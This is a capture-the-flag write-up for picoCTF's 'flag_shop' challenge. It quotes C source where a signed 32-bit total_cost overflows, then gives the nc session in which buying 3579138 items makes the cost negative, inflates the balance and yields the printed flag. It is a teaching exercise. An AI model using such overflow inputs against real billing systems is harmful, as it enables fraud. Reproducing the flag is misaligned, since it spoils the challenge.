# flag_shop

__PROBLEM__

There's a flag shop selling stuff, can you buy a flag? [Source](store.c). Connect with nc 2019shell1.picoctf.com 29250.

__HINT__

Two's compliment can do some weird things when numbers get really big!

__SOLUTION__

By reading the source code, we see that the total_cost is stored as a 4 byte signed integer:

```
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 900*number_flags;
    printf("\nThe final cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
        printf("\nYour current balance after transaction: %d\n\n", account_balance);
    }
    else{
        printf("Not enough funds to complete purchase\n");
    }
}

```
If we enter a large number for number_flags, 900*number_flags would overflow and turn into a large negative number.

```
$ nc 2019shell1.picoctf.com 29250
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3579138

The final cost is: -1073743096

Your current balance after transaction: 1073744196

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_cd0ead78}

```


FLAG - `picoCTF{m0n3y_bag5_cd0ead78}`
